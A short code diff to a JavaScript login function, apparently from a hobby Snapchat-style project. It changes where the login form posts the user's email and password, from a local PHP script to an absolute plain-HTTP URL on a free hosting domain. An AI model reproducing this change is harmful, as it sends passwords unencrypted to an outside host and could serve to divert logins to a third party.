@@ -38,7 +38,7 @@ xmlhttp.onreadystatechange=function()
     }
   }  
   
-xmlhttp.open("POST","php/logindb.php",true);
+xmlhttp.open("POST","http://gguerind.0fees.net/mysnapchat/php/logindb.php",true);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send("e="+email+"&p="+password);
 }
